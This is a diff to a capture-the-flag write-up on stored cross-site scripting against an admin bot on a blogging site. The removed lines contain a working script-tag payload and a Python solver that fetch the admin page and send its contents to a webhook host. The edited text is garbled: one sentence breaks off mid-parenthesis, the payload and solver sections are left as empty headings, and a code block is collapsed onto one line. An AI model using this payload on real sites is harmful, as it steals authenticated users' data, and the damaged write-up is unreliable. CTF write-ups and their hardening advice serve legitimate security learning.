@@ -1,12 +1,12 @@
 # Technical Write-Up: The Blog (Stored XSS & Context Exfiltration)
 
-## 1. Challenge Specification
+## Challenge Specification
 
 - **Target Application**: Standard blogging engine with articles and a public contact submission form (`/contact`).
 - **Simulated Environment**: An editorial bot with authenticated administrative privileges periodically navigates to the inbox in a real browser instance and opens unread messages.
 - **Flag Format**: `InvataCyber{...}`
 
-## 2. Attack Surface Analysis & Root Cause
+## Attack Surface Analysis & Root Cause
 
 The application exposes two primary components:
 1. **Public Ingress**: Contact submission form at `/contact` accepting `name`, `email`, and `message` via HTTP POST.
@@ -14,54 +14,24 @@ The application exposes two primary components:
 
 ### Vulnerability Mechanism
 
-The server stores incoming messages in its database without applying contextual HTML entity encoding (e.g. `htmlspecialchars()`) or DOM sanitization (e.g. `DOMPurify`). When the admin bot reviews unread messages, the unsanitized `message` content is inserted directly into the page DOM as raw HTML, executing arbitrary JavaScript in the context of the administrator's authenticated session (Stored Cross-Site Scripting).
+The server stores incoming messages in its database without applying contextual HTML entity encoding (e.g.
 
-Even if session cookies are protected with the `HttpOnly` flag (preventing direct `document.cookie` theft), the bot executes in an authenticated browser state. The injected payload can issue an asynchronous `fetch('/admin')` request, inheriting session credentials automatically, and transmit the returned HTML body to an external listener.
+Even if session cookies are protected with the `HttpOnly` flag (preventing direct `document.cookie` theft), the bot executes in an authenticated browser state.
 
-## 3. Exploit Payload Engineering
+## Exploit Payload Engineering
 
 The payload executes in three sequential stages:
 1. Issues an asynchronous `fetch()` request to `/admin`.
 2. Converts the response stream to raw text.
 3. Transmits the response text (containing the flag) to an external webhook.
 
-```javascript
-fetch('/admin')
-  .then(r => r.text())
-  .then(t => fetch('https://webhook.site/<TOKEN>?data=' + encodeURIComponent(t)));
-```
-
 Wrapped in a `<script>` tag for injection into the `message` field:
-```html
-<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/<TOKEN>?data='+encodeURIComponent(t)))</script>
-```
 
-## 4. Automated Python Solver (`solver.py`)
+## Automated Python Solver (`solver.py`)
 
-```python
-#!/usr/bin/env python3
-import requests
-
-TARGET_URL = "http://target.invatacyber.ro/contact"
-WEBHOOK_URL = "https://webhook.site/<TOKEN>"
-
-payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK_URL}?data='+encodeURIComponent(t)))</script>"
-
-data = {
-    "name": "Security Researcher",
-    "email": "researcher@stefanut.lan",
-    "message": payload
-}
-
-response = requests.post(TARGET_URL, data=data)
-print(f"[*] Payload delivered! Server responded with status code: {response.status_code}")
-```
-
-## 5. Remediation & Hardening Recommendations
+## Remediation & Hardening Recommendations
 
 1. **Context-Aware Output Encoding**: Ensure all user-supplied input rendered in HTML templates is encoded (e.g. using Jinja2 automatic escaping or React DOM bindings).
 2. **Content Security Policy (CSP)**: Deploy strict CSP headers forbidding unauthorized inline scripts and restricting outbound network connections:
-   ```http
-   Content-Security-Policy: default-src 'self'; script-src 'nonce-<RANDOM>'; connect-src 'self';
-   ```
+```http Content-Security-Policy: default-src 'self'; script-src 'nonce-<RANDOM>'; connect-src 'self'; ```
 3. **DOMPurify Sanitization**: If rich-text HTML rendering is required, sanitize markup using DOMPurify before DOM insertion.
